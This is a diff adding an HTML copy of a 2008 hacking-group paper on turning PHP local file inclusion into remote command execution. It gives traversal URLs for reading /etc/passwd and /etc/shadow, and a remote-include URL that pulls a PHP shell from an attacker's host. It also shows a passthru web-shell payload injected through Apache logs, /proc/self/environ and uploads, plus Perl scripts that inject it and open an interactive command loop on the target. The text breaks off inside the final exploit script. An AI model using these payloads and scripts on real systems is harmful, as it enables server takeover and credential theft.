@@ -1,0 +1,906 @@
+<html>
+<head>
+<title>LFI to RCE Exploit with Perl Script</title>
+<pre>
+		|=--------------------------------------------------------------------=|
+		|=-------------=[ LFI to RCE Exploit with Perl Script ]=--------------=|
+		|=------------------------=[ 7 December 2008 ]=-----------------------=|
+		|=----------------------=[  By CWH Underground  ]=--------------------=|
+		|=--------------------------------------------------------------------=|
+				
+
+######
+ Info
+######
+
+Title	: LFI to RCE Exploit with Perl Script
+Author	: ZeQ3uL &amp;&amp; JabAv0C
+Team    : CWH Underground [www.milw0rm.com/author/1456]
+Website	: cwh.citec.us / www.citec.us
+Date	: 2008-12-07
+
+
+##########
+ Contents
+##########
+
+  [0x00] - Introduction
+
+  [0x01] - File Inclusion (RFI/LFI)
+
+	[0x01a] - How the attack works for Remote File Inclusion [RFI]
+	[0x01b] - How the attack works for Local File Inclusion [LFI]
+	[0x01c] - Vulnerable PHP Function for File Inclusion
+
+  [0x02] - Local File Inclusion To Remote Command Execution [LFI &lt;&gt; RCE]
+	
+	[0x02a] - LFI &lt;&gt; RCE via Apache Log Injection
+	[0x02b] - LFI &lt;&gt; RCE via Process Environ Injection
+	[0x02c] - LFI &lt;&gt; RCE via Other Files
+
+  [0x03] - Fundamental of Perl Library for Exploit Website
+
+	[0x03a] - Introduction to Socket
+	[0x03b] - Introduction to Library for WWW in Perl (LWP)
+	[0x03c] - Condition to use Socket or LWP
+
+  [0x04] - Writing LFI &lt;&gt; RCE Exploit with Perl Script
+
+	[0x04a] - Perl Exploit to Injecting code into Target
+	[0x04b] - Perl Exploit to Executing injected code on Target
+	[0x04c] - LFI &lt;&gt; RCE Complete Exploit [Use Logfile Injection]
+
+  [0x05] - How to protect File Inclusion
+
+  [0x06] - References
+
+  [0x07] - Greetz To
+
+
+#######################
+ [0x00] - Introduction
+#######################
+
+	Welcome reader, this paper is a short attempt at documenting a practical technique 
+we have been working on. This papers will guide about technique that allows the attackers 
+(us) gaining access into the process of exploiting a website via File Inclusion (RFI/LFI)
+and enlight the way to create own exploit script with perl
+
+	This paper is divided into 7 sections but only from section 0x01 to 0x05
+are about technical information.
+
+	Section 0x01, we talk about general concept of attacking via File Inclusion.
+Section 0x02, we give a detail of how to execute arbitrary command via Local File Inclusion
+in each approach. Section 0x03, we offer rudimentary commands to create HTTP transaction
+with perl and some examples of how to use them. Section 0x04, we assemble knowleadge from
+Section 0x01 to 0x03 in order to create own exploit to execute command on target system
+via Local File Inclusion. The last, section 0x05, we suggest some methods to protect
+your system from File Inclusion Attacking.
+
+
+###################################
+ [0x01] - File Inclusion (RFI/LFI)
+###################################
+	
+	In a File Inclusion, Attackers run their own code on a vulnerable website. 
+The attack involves importing code into a program by taking advantage of the unenforced 
+and unchecked assumptions the program makes about its inputs. If the attacker can include 
+their own malicious code on a web page, it is possible to &quot;convince&quot; a PHP script to include 
+a remote file instead of a presumably trusted file from the local file system. 
+
+
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	 [0x01a] - How the attack works for Remote File Inclusion [RFI]
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	
+		Remote File Inclusion, known as RFI, is the technique to attack website by 
+	injecting php script into target website. It's including &quot;External&quot; files (PHP Shell) 
+	in a victim website.If attacker exploits successfully, he can execute arbitary command 
+	on victim web server.
+
+	For instance, a piece of vulnerable PHP code would look like this:
+
+	[code]----------------------------------------------------------------------------------
+	&lt;?php
+	$file =$_GET['page'];				//The page we wish to display
+	include($file .&quot;.php&quot;);				&lt;-- Vulnerable !!
+	?&gt;
+	[End code]---------------------------------------------------------------------------------
+	
+	From Code, It does not perform any checks on the content of the $page variable so it is easy 
+	to putting our file (PHP Shell) into webpage like this
+	
+	[URL] http://www.hackme.com/index.php?page=http://www.cwh.org/c99.php? and then
+
+	[code]---------------------------------------------------------------------------------
+	&lt;?php
+	$file =&quot;http://www.cwh.org/c99.php?&quot;;		//$_GET['page'];
+	include($file .&quot;.php&quot;);				//include http://www.cwh.org/C99.php?.php
+	?&gt;
+	[End code]---------------------------------------------------------------------------------
+	
+	** We put &quot;?&quot; at the end of the URL, This makes the script fetch the intended file, 
+	with the appended string as a parameter (which is ignored by the attackers script) **
+
+	
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	 [0x01b] - How the attack works for Local File Inclusion [LFI]
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	
+		LFI is a Local File Inclusion. It originates from including &quot;internal&quot; files 
+	in a victim website. In many situations, It is necessary to include content from 
+	local file. But if you use it carelessly, it may lead to LFI vulnerabilty. This method
+	is often used in Linux to get &quot;/etc/passwd&quot; and sometimes &quot;/etc/shadow&quot;.
+	
+	For instance, a piece of vulnerable PHP code would look like this:
+
+	[URL] http://www.hackme.com/index.php?template=cwh
+
+	[code #1]-------------------------------------------------------------------------------
+	&lt;?php
+	$template =$_GET['template'];
+	include(&quot;/&quot;.$template .&quot;.php&quot;);			&lt;-- Vulnerable !!
+	?&gt;
+	[End code]------------------------------------------------------------------------------
+
+	From Code, Attacker can assign template to be &quot;../../../../etc/passwd%00&quot;.
+	It causes the attacker to read a content from /etc/passwd.
+
+	[URL] http://www.hackme.com/index.php?template=../../../../etc/passwd%00
+
+	[code #1]-------------------------------------------------------------------------------
+	&lt;?php
+	$template =$_GET['template'];
+	include(&quot;/../../../../etc/passwd%00.php&quot;);	&lt;-- Directory Traversal to LFI
+	?&gt;
+	[End code]------------------------------------------------------------------------------
+
+	** Notice %00 (Null CHAR) will ignore everything that comes after %00 (.php suffix) **
+	** Notice ../../../ will traversal path to root and goto /etc/passwd **
+
+	[code #2]-------------------------------------------------------------------------------
+	if(grado($HTTP_COOKIE_VARS['cwh_user'],$HTTP_COOKIE_VARS['cwh_pass']) == &quot;admin&quot;)
+	{
+	topmenu();
+	include(&quot;manage/admin/main.php&quot;);
+	foot();
+	} else 
+		{
+			topmenu();
+			include(&quot;manage/&quot;.$HTTP_COOKIE_VARS['cwh_user'].&quot;/main.php&quot;);
+			foot();
+		}
+	[End code]------------------------------------------------------------------------------
+	
+	From Code, Attacker can exploit via JaSiLDBG 
+	(Javascript Inline Debugger - www.milw0rm.com/papers/147)
+	
+	PoC Exploit: javascript:document.cookie = &quot;cwh_user=../../../../etc/passwd%00; path=/&quot;;
+
+
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	 [0x01c] - Vulnerable PHP Function for File Inclusion
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	
+		File Inclusion (RFI/LFI) mostly occurs from some functions that developers
+	do not properly check user supplied data.
+	
+	Example PHP function:
+
+	include()
+	include_once()
+	require()
+	require_once()
+	fopen()
+
+
+#######################################################################
+ [0x02] - Local File Inclusion To Remote Command Execution [LFI&lt;&gt;RCE]
+#######################################################################
+
+	In this section, we mention about the concept of using LFI in another way besides reading files. 
+Normally, We use LFI to read following files:
+	
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/security/passwd
+/etc/security/user
+/etc/security/environ
+/etc/security/limits
+or
+Dababase Configuration (config.inc.php)
+	
+	But we can apply LFI Vulnerabilities to execute command by injecting malicious code
+into Apache log, Process Environment and Other files. This method is called &quot;Remote Code Execution (RCE)&quot;
+
+
+	+++++++++++++++++++++++++++++++++++++
+	 [0x02a] - LFI &lt;&gt; RCE via Apache Log
+	+++++++++++++++++++++++++++++++++++++
+
+	The Malicious HTTP Request must existed to Apache logs, By their intrinsic nature logfiles contain
+	data that is driven by users look like this:
+	
+	[HTTP Request via Telnet]---------------------------------------------------------------		
+	&gt;telnet www.hackme.com 80
+	GET /index.php?p=new.php HTTP/1.1				&lt;-- Normally GET Request when user visit websites
+
+	HTTP/1.1 200 OK Content-Length: 82015 Content-Type: text/html Content-Location: ……
+	………
+	[End Telnet]----------------------------------------------------------------------------
+
+	[Logfiles - access.log]-----------------------------------------------------------------
+	......
+	58.18.29.152 - - [05/Dec/2008:12:13:22 +0700] 
+	&quot;GET /index.php?p=new.php HTTP/1.1&quot; 200 1958
+	......
+	[End log]-------------------------------------------------------------------------------
+
+		If we want to run arbitrary command on target system, we must inject PHP code via 
+	HTTP request like &lt;?passthru($_GET[cmd])?&gt; After that logfiles will contain Malicious Code
+
+	[Malicious HTTP Request via Telnet]-----------------------------------------------------
+	&gt;telnet www.hackme.com 80
+	GET /cwh/&lt;? passthru($_GET[cmd]) ?&gt; HTTP/1.1			&lt;-- Malicious HTTP Request via Telnet
+
+	………
+	………
+	[End telnet]----------------------------------------------------------------------------
+
+	[Logfiles - access.log]-----------------------------------------------------------------
+	......
+	58.18.29.152 - - [05/Dec/2008:12:14:22 +0700] 
+	&quot;GET /cwh/&lt;? passthru($_GET[cmd]) ?&gt; HTTP/1.1&quot; 200 1958		&lt;-- Inject Code into Logfiles
+	......
+	[End log]-------------------------------------------------------------------------------
+	
+		Now We can use LFI Vuln to run arbitrary command by finding out where the logs are stored
+	Go to LFI Vuln path:
+	
+	[URL] www.hackme.com/index.php?p=../../apache/logs/access.log	&lt;-- You must find Log location
+	(You can see ../../ that traversal to apache access log)
+
+	In webpage, you will see detailed like this:
+	
+	Warning: passthru() [function.passthru]: Cannot execute a blank command in 
+	/opt/lampp/apache/logs/access.log  on line 457
+
+		That's Great !! We have alredy injected code to logfiles, Now run arbitrary command
+	with &quot;cmd&quot; variable like this:
+
+	[LFI &lt;&gt; RCE URL] www.hackme.com/index.php?p=../../apache/logs/access.log%00&amp;cmd=ls -la
+
+	** Notice **
+		
+		If you send Malicious HTTP Request from browser
+	&quot;www.hackme.com/cwh/&lt;? passthru($_GET[cmd]) ?&gt;&quot;, the logfile will show in URL encode format 
+		
+	[Logfiles - access.log]-----------------------------------------------------------------
+	......
+	58.18.29.152 - - [05/Dec/2008:12:15:14 +0700] 
+	&quot;GET /cwh/%3C?%20passthru($_GET[cmd])%20?%3E HTTP/1.1&quot; 200 1958	&lt;-- Not work for Inject
+	......
+	[End log]-------------------------------------------------------------------------------
+	
+		It won't work for RCE because browser will automatically encode special characters
+	(URL encode) after that it writes encoded request into logfiles (access.log).
+		So we must Inject malicious code via Telnet, Netcat or Perl script with 
+	socket/useragent/referer that we will guide in next chapter.
+
+		== How about error.log ==
+		
+		Error log is written when the requested file does not exist. Thus we can inject
+	malicious code by requesting to non-existed file or inject via &quot;Referer&quot;.
+
+	[Malicious HTTP Request via Telnet]-----------------------------------------------------
+	&gt;telnet www.hackme.com 80
+	GET /&lt;? passthru($_GET[cmd]) ?&gt;		&lt;-- Get non-existed file with PHP Code
+
+	………
+	………
+	[End telnet]----------------------------------------------------------------------------
+
+	[Logfiles - error.log]------------------------------------------------------------------
+	......
+	[Sat Dec 06 15:12:56 2008] [error] [client 127.0.0.1] (20024)The given path 
+	misformatted or contained invalid characters: Cannot map GET /&lt;?passthru($_GET[cmd])?&gt; to file
+	......
+	[End log]-------------------------------------------------------------------------------
+		
+		Bingo !! We can injected code thru error.log, Next example show you about inject code
+	into &quot;referer&quot;.
+
+	[Logfiles - error.log]------------------------------------------------------------------			
+	......
+	[Sat Dec 06 13:57:57 2008] [error] [client 58.14.21.120] 
+	File does not exist: /opt/lampp/htdocs/test/images/boxmenu.gif, 
+	referer: http://www.hackme.com/index.php?p=main.php	&lt;-- Normally HTTP Request
+	......
+	[End log]-------------------------------------------------------------------------------
+
+		From log, Attacker can inject malicious code into &quot;referer&quot; then error.log will be written
+	evil code. However injecting to access.log is easier than error.log 
+
+	[Logfiles - error.log]------------------------------------------------------------------		
+	......
+	[Sat Dec 06 13:57:57 2008] [error] [client 58.14.21.120] 
+	File does not exist: /opt/lampp/htdocs/test/images/boxmenu.gif, 
+	referer: &lt;? passthru($_GET[cmd]) ?&gt;			&lt;-- Inject Malicious Code in Referer
+	......
+	[End log]-------------------------------------------------------------------------------
+
+		Default Log locations list that used with LFI:
+
+	../apache/logs/error.log
+	../apache/logs/access.log
+	../../apache/logs/error.log
+	../../apache/logs/access.log
+	../../../apache/logs/error.log
+	../../../apache/logs/access.log
+	../../../../../../../etc/httpd/logs/acces_log
+	../../../../../../../etc/httpd/logs/acces.log
+	../../../../../../../etc/httpd/logs/error_log
+	../../../../../../../etc/httpd/logs/error.log
+	../../../../../../../var/www/logs/access_log
+	../../../../../../../var/www/logs/access.log
+	../../../../../../../usr/local/apache/logs/access_ log
+	../../../../../../../usr/local/apache/logs/access. log
+	../../../../../../../var/log/apache/access_log
+	../../../../../../../var/log/apache2/access_log
+	../../../../../../../var/log/apache/access.log
+	../../../../../../../var/log/apache2/access.log
+	../../../../../../../var/log/access_log
+	../../../../../../../var/log/access.log
+	../../../../../../../var/www/logs/error_log
+	../../../../../../../var/www/logs/error.log
+	../../../../../../../usr/local/apache/logs/error_l og
+	../../../../../../../usr/local/apache/logs/error.l og
+	../../../../../../../var/log/apache/error_log
+	../../../../../../../var/log/apache2/error_log
+	../../../../../../../var/log/apache/error.log
+	../../../../../../../var/log/apache2/error.log
+	../../../../../../../var/log/error_log
+	../../../../../../../var/log/error.log
+
+
+	++++++++++++++++++++++++++++++++++++++++++
+	 [0x02b] - LFI &lt;&gt; RCE via Process Environ
+	++++++++++++++++++++++++++++++++++++++++++
+
+		When we request to PHP page, new process will be created. In *nix system, Each process 
+	has its own /proc entry. /proc/self/ is a static path and symbolic link from lastest process
+	used that contain useful information. If we inject malicious code into /proc/self/environ, we
+	can run arbitrary command from target via LFI
+
+	[The Question] How to inject code into /proc/self/environ ?
+	[The Answer]   We can inject thru User-Agent.
+
+		In Firefox Browser, we use &quot;User Agent Switcher Add-ons&quot; that can specify your user agent
+	manually Or use perl script to specify user agent with malicious code (See Next chapter).
+
+	For instance, a piece of /proc/self/environ would look like this:
+	
+	[code]----------------------------------------------------------------------------------
+	PATH=/sbin:/usr/sbin:/bin:/usr/bin:/usr/X11R6/bin:/usr/bin:/bin
+	SERVER_ADMIN=root@hackme.com
+	...
+	Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.4) 
+	Gecko/2008102920 Firefox/3.0.4 HTTP_KEEP_ALIVE=300		&lt;-- It contains User-agent
+	...
+	[End code]------------------------------------------------------------------------------
+
+		When we injected &lt;?passthru($_GET[cmd])?&gt; into our User Agent, 
+	/proc/self/environ will contain Malicious code like this:
+
+	[code]----------------------------------------------------------------------------------
+	PATH=/sbin:/usr/sbin:/bin:/usr/bin:/usr/X11R6/bin:/usr/bin:/bin
+	SERVER_ADMIN=root@hackme.com
+	...
+	&lt;?passthru($_GET[cmd])?&gt; HTTP_KEEP_ALIVE=300			&lt;-- Injected Malicious code
+	...
+	[End code]------------------------------------------------------------------------------
+
+		Then Go to www.hackme.com/index.php?p=../../../../../proc/self/environ%00&amp;cmd=ls -la
+
+	** Notice **
+		
+		We don't recommend to use this method because It's immediately to inject code and run
+	command before self link change to other process.
+		
+
+	++++++++++++++++++++++++++++++++++++++
+	 [0x02c] - LFI &lt;&gt; RCE via Other Files
+	++++++++++++++++++++++++++++++++++++++
+
+		 We saw Vulnerabilities in old version of FCKEditor (www.milw0rm.com/exploits/1484)
+	that allow many file extension to be uploaded, Some versions we can upload an extension not specified in FCKEditor 
+	Config[DeniedExtensions][File] array such as .php3,.aa,.bb,.cwh,.blahblahblah. If the website have vulnerability
+	in Local File Inclusion, we can inject malicious code (&lt;?passthru($_GET[cmd])?&gt;) into uploaded file and use LFI 
+	traversal with uploaded file links (/userfiles/upload/shell.cwh) to run arbitrary command.
+
+		For example:
+
+		[LFI Vulnerable] www.hackme.com/index.php?p=
+		[Uploaded File]  www.hackme.com/userfiles/upload/shell.cwh
+		[LFI &lt;&gt; RCE]	 www.hackme.com/index.php?p=./userfiles/upload/shell.cwh%00&amp;cmd=ls -la
+
+		Many website in the world allow to upload image file (jpg/gif/bmp/...) almost websites only check file extension 
+	(.jpg/.gif/...) so it's vuln !!. If Attacker inject malicious code into image file (Maybe use edjpgcom to insert PHP code
+	to jpeg file or change extension to image file manually) and upload to target server, Use LFI technique traversal to
+	uploaded file and execution arbitrary command.
+
+		** We will guide you about specify file extension with Perl in Next chapter **
+
+
+##########################################################	
+ [0x03] - Fundamental of Perl Library for Exploit Website
+##########################################################
+		
+	In this section, we will talk about fundamental of neccessary perl commands used to send HTTP packet to server. 
+They play a significant role in writing exploit. We recommend you to read this section before step to next section. 
+But if you are familiar with Socket and LWP, you can skip this section. All commands mentioned in this section will be 
+used in next section.
+
+	++++++++++++++++++++++++++++++++++
+	 [0x03a] - Introduction to Socket
+	++++++++++++++++++++++++++++++++++
+
+		Socket is method to create a connection between hosts. we use it to create a connection between our pc 
+	and a remote server in order to send manipulated request to a server. The informations that we have to provide for 
+	a socket are protocol, server address, server port and data. In perl, we use IO::Socket library to create a socket. 
+	
+	Syntax for create a socket is following.
+
+	[code]----------------------------------------------------------------------------------
+	$socket = IO::Socket::INET-&gt;new (PROTOCAL, PEERADDR, PEERPORT);
+	[End code]------------------------------------------------------------------------------
+
+	For Example: If we want to create socket to port 80 on server ip 192.168.0.111 with tcp protocol, 
+	we can use following command:
+
+	[code]----------------------------------------------------------------------------------
+	$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;);
+	[End code]------------------------------------------------------------------------------
+	
+	when we want to send http request through this socket, we can use this syntax.
+
+	[code]----------------------------------------------------------------------------------
+	print $socket $data;
+	[End code]------------------------------------------------------------------------------
+
+	For Example:
+
+	[code]----------------------------------------------------------------------------------
+	$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;);
+	print $socket &quot;GET /index.php HTTP/1.1\r\n&quot;;
+	print $socket &quot;Host: 192.168.0.111\r\n&quot;;
+	print $socket &quot;Connection: close\r\n\r\n&quot;;
+	[End code]------------------------------------------------------------------------------
+
+	After finish using socket, we have to close the socket by this syntax.
+
+	[code]----------------------------------------------------------------------------------
+	close ($socket);
+	[End code]------------------------------------------------------------------------------
+
+	Finally, we can group the entire code together.
+
+	[code]----------------------------------------------------------------------------------
+	use IO::Socket;
+	$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;);
+	print $socket &quot;GET /index.php HTTP/1.1\r\n&quot;;
+	print $socket &quot;Host: 192.168.0.111\r\n&quot;;
+	print $socket &quot;Connection: close\r\n\r\n&quot;;
+	close ($socket);
+	[End code]------------------------------------------------------------------------------
+
+
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	 [0x03b] - Introduction to Library for WWW in Perl (LWP)
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+		LWP is a set of perl module designed to handle sending of http request. Usually we use this library
+	simultaneously with HTTP::Request and HTTP::Response.
+	
+	If we speak clearly, we can classify a role of these library as following:
+
+	- HTTP::Request  =&gt; used to manipulate http request.
+	- LWP::UserAgent =&gt; used to sent http request.
+	- HTTP::Response =&gt; used to handle http response.
+
+	If we want to use these libraries to obtain content from index.php file on 192.168.0.111, 
+	we can following these steps.
+
+	1: Create http request header using HTTP::Request
+
+	[code]----------------------------------------------------------------------------------
+	$request = HTTP::Request-&gt;new (GET =&gt; &quot;http://192.168.0.111/index.php&quot;);
+	$request-&gt;header (User_Agent =&gt; &quot;Mozilla 2.0&quot;);
+	[End code]------------------------------------------------------------------------------
+
+	2: Send the http request to server by LWP::UserAgent and obtain http response by HTTP::Response
+
+	[code]----------------------------------------------------------------------------------
+	$ua = LWP::UserAgent-&gt;new();
+	$response = $ua-&gt;request ($request);	## Return value of request function is HTTP::Response object. 
+						## So now we have $response holding HTTP::Response object
+	[End code]------------------------------------------------------------------------------
+
+	3: Get http response content from HTTP::Response object, Ex:
+
+	[code]----------------------------------------------------------------------------------
+	print $response-&gt;code;			## response code ex. 200, 404, 503
+	print $response-&gt;header-&gt;as_string;	## response header
+	print $response-&gt;content;		## html code of http response
+	[End code]------------------------------------------------------------------------------
+
+	If we group all code together to show header and content of http transaction, we can do following:
+
+	[code]----------------------------------------------------------------------------------
+	use LWP;
+	use HTTP::Request;
+
+	$request = HTTP::Request-&gt;new (GET =&gt; &quot;http://192.168.0.111/index.php&quot;);
+	$request-&gt;header (User_Agent =&gt; &quot;Mozilla 2.0&quot;);
+	
+	$ua = LWP::UserAgent-&gt;new();
+	$response = $ua-&gt;request ($request);
+
+	print $response-&gt;header-&gt;as_string;	 ## $response-&gt;header is an object of HTTP::Header. It cannot to print as string, 
+						 ## so we use as_string method to solve this problem
+	print &quot;\n&quot;;
+	print $response-&gt;content;
+	[End code]------------------------------------------------------------------------------
+
+
+	++++++++++++++++++++++++++++++++++++++++++
+	 [0x03c] - Condition to use Socket or LWP
+	++++++++++++++++++++++++++++++++++++++++++
+
+		As you can see above, Socket and LWP can send http request to server.
+	But we have only a few conditions to dicide to use Socket or LWP.
+
+	1: We will use Socket when,
+
+	- We do not want http response. (Only inject http request packet to server)
+	- We do not want http request to be encoded. (If we send get method with LWP, the HTTP request will be URL Encoded)
+	
+	2: We will use LWP when,
+
+	- We want http response. (It will be stored in HTTP::Response object)
+	- Other condition ;D (We think it is more convenient to us than Socket)
+
+
+######################################################	
+ [0x04] - Writing LFI &lt;&gt; RCE Exploit with Perl Script
+######################################################
+
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	 [0x04a] - Perl Exploit to Injecting code into Target
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+		We can inject our php code to server in many ways as I mention above. The rest that we have to work 
+	with is creating perl script to do our task. 
+		To create perl script to send malicious request, we will use socket to help this part. 
+	Before writing perl script, we have to know which file we will inject code into and how to do that.
+
+	[+] Inject via logfile
+
+		Logfiles are written when there is a request to a file on server. Thus we can manipulate 
+	http request in order to inject malicious code.
+	
+	Example:
+
+	[code]----------------------------------------------------------------------------------
+	$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;);
+	print $socket &quot;GET /cwhunderground &lt;? passthru(\$_GET[cmd]); ?&gt; HTTP/1.1\r\n&quot;;
+	print $socket &quot;host: 192.168.0.111\r\n&quot;;
+	print $socket &quot;Connection: close\r\n\r\n&quot;;
+	close ($socket);
+	[End code]------------------------------------------------------------------------------
+
+
+	[+] Inject via Other files
+
+		In some websites, they allow us to upload files. If we know the path to uploaded file, 
+	we can use LFI vulnerability to execute command in our uploaded file.
+
+	Example:
+
+	[code]----------------------------------------------------------------------------------
+	$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;);
+	print $socket &quot;POST /uploadsave.php HTTP/1.1\r\n&quot;;
+	print $socket &quot;host: 192.168.0.111\r\n&quot;;
+	print $socket &quot;Content-Type: multipart/form-data; boundary=CwHCwH\r\n&quot;;
+	print $socket &quot;--CwHCwH\r\n&quot;;
+	print $socket &quot;Content-Disposition: form-data; name=\&quot;shell.cwh\&quot;; filename=\&quot;shell.cwh\&quot;\r\n&quot;;
+	print $socket &quot;Content-Type: application/zip\r\n\r\n&quot;;
+	print $socket &quot;&lt;? passthru(\$_GET[cmd]); ?&gt;\n&quot;;
+	print $socket &quot;--CwHCwH\r\n&quot;;
+	close ($socket);
+	[End code]------------------------------------------------------------------------------
+
+
+	[+] Inject via process environment
+
+		In process environment file, there is user agent of using browser as a part of content. 
+	Therefore we can inject malicious code by spoofing user agent.
+	
+	Example:
+
+	[code]----------------------------------------------------------------------------------
+	$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;);
+	print $socket &quot;GET /index.php HTTP/1.1\r\n&quot;;
+	print $socket &quot;host: 192.168.0.111\r\n&quot;;
+	print $socket &quot;User-Agent: &lt;? passthru(\$_GET[cmd]); ?&gt;\r\n&quot;;
+	print $socket &quot;Connection: close\r\n\r\n&quot;;
+	close ($socket);
+	[End code]------------------------------------------------------------------------------
+
+
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	 [0x04b] - Perl Exploit to Executing injected code on Target
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+		As previous section, we can inject malicious code into some files on server by example code.
+	In this section, we will show how to create script to execute our code on server. So, we have to bring 
+	the concept from section 0x03b about LWP library.
+	(We choose to use LWP because we need http response to show result from execution of our code)
+
+	[+] Execute code from logfile
+
+	[code]----------------------------------------------------------------------------------
+	use LWP;
+	use HTTP::Request;
+
+	$logfile = &quot;../../../../var/log/httpd/access.log&quot;;		&lt;-- We must specify Logfile locations
+
+	## looping for execute command and exit program when command = exit ##
+	print &quot;cwh-shell# &quot;;
+	chomp( $cmd = &lt;STDIN&gt; );
+	while($cmd !~ &quot;exit&quot;) 
+	{
+	   $content = &quot;&quot;;
+	   $request = HTTP::Request-&gt;new (GET =&gt; &quot;http://192.168.0.111/path/to/lfi.php?file=&quot;.$logfile.&quot;%00&amp;cmd=&quot;.$cmd);
+	   $ua = LWP::UserAgent-&gt;new();
+	   $response = $ua-&gt;request ($request);
+	   $content = $response-&gt;content;
+	   print $content.&quot;\n&quot;;
+	   print &quot;cwh-shell# &quot;;
+	   chomp( $cmd = &lt;STDIN&gt; );
+	}
+	[End code]------------------------------------------------------------------------------
+
+
+	[+] Execute code from Other files
+
+		I assume that the uploaded file is ../../../path/to/uploaded/file/shell.cwh .
+	We will get RCE script like this.
+
+	[code]----------------------------------------------------------------------------------
+	use LWP;
+	use HTTP::Request;
+
+	$uploadedfile = &quot;../../../path/to/uploaded/file/shell.cwh&quot;;
+
+	## looping for execute command and exit program when command = exit ###
+	print &quot;cwh-shell# &quot;;
+	chomp( $cmd = &lt;STDIN&gt; );
+	while($cmd !~ &quot;exit&quot;) 
+	{
+	   $content = &quot;&quot;;
+	   $request = HTTP::Request-&gt;new (GET =&gt; &quot;http://192.168.0.111/path/to/lfi.php?file=&quot;.$uploadedfile.&quot;%00&amp;cmd=&quot;.$cmd);
+	   $ua = LWP::UserAgent-&gt;new();
+	   $response = $ua-&gt;request ($request);
+	   $content = $response-&gt;content;
+	   print $content.&quot;\n&quot;;
+	   print &quot;cwh-shell# &quot;;
+	   chomp( $cmd = &lt;STDIN&gt; );
+	}
+	[End code]------------------------------------------------------------------------------
+
+	[+] Execute code from process environment
+
+		The injected process environment file is /proc/self/environ.
+	So, we have to traversal back to root path by using ../../
+
+	[code]----------------------------------------------------------------------------------
+	use LWP;
+	use HTTP::Request;
+	
+	$procenviron = &quot;../../../../../../proc/self/environ&quot;;
+	
+	## looping for execute command and exit program when command = exit ##
+	print &quot;cwh-shell# &quot;;
+	chomp( $cmd = &lt;STDIN&gt; );
+	while($cmd !~ &quot;exit&quot;) 
+	{
+	   $content = &quot;&quot;;
+	   $request = HTTP::Request-&gt;new (GET =&gt; &quot;http://192.168.0.111/path/to/lfi.php?file=&quot;.$procenviron.&quot;%00&amp;cmd=&quot;.$cmd);
+	   $ua = LWP::UserAgent-&gt;new();
+	   $response = $ua-&gt;request ($request);
+	   $content = $response-&gt;content;
+	   print $content.&quot;\n&quot;;
+	   print &quot;cwh-shell# &quot;;
+	   chomp( $cmd = &lt;STDIN&gt; );
+	}
+	[End code]------------------------------------------------------------------------------
+
+
+		Finally, as you can see from three codes above, the code to loop for execute command is the same.
+	The difference is how to find a path of injected file.
+
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	 [0x04c] - LFI &lt;&gt; RCE Complete Exploit [Use Logfile Injection]
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+		In order to execute code from logfile, we have a problem that we do not know the exact path of logfile. 
+	So we have to find path by looping through the fesible paths that we have and see which file contain 
+	the word &quot;cwhunderground&quot; as we inject in previous example code.
+
+	Simple Code for LFI &lt;&gt; RCE Exploit:
+
+	[code]----------------------------------------------------------------------------------
+	use LWP::UserAgent;
+	use IO::Socket;
+	use LWP::Simple;
+
+	$log=&quot;../&quot;;
+	@apache=(
+	&quot;../../../../../var/log/httpd/access_log&quot;,
+	&quot;../apache/logs/access.log&quot;,
+	&quot;../../apache/logs/access.log&quot;,
+	&quot;../../../apache/logs/access.log&quot;,
+	&quot;../../../../apache/logs/access.log&quot;,
+	&quot;../../../../../apache/logs/access.log&quot;,
+	&quot;../logs/access.log&quot;,
+	&quot;../../logs/access.log&quot;,
+	&quot;../../../logs/access.log&quot;,
+	&quot;../../../../logs/access.log&quot;,
+	&quot;../../../../../logs/access.log&quot;,
+	&quot;../../../../../etc/httpd/logs/access_log&quot;,
+	&quot;../../../../../etc/httpd/logs/access.log&quot;,
+	&quot;../../.. /../../var/www/logs/access_log&quot;,
+	&quot;../../../../../var/www/logs/access.log&quot;,
+	&quot;../../../../../usr/local/apache/logs/access_log&quot;,
+	&quot;../../../../../usr/local/apache/logs/access.log&quot;,
+	&quot;../../../../../var/log/apache/access_log&quot;,
+	&quot;../../../../../var/log/apache/access.log&quot;,
+	&quot;../../../../../var/log/access_log&quot;,
+	&quot;../../../../../var/log/access_log&quot;
+	);
+
+	my $sis=&quot;$^O&quot;;if ($sis eq 'MSWin32') { system(&quot;cls&quot;); } else { system(&quot;clear&quot;); }
+
+	print &quot;\n==========================================\n&quot;;
+	print &quot;		   LFI to RCE Exploit \n&quot;;
+	print &quot;		   By CWH Underground \n&quot;;
+	print &quot;==========================================\n&quot;;
+	
+	if (@ARGV &lt; 2)
+	{
+	    print &quot;Usage: ./xpl.pl &lt;Host&gt; &lt;Path&gt;\n&quot;;
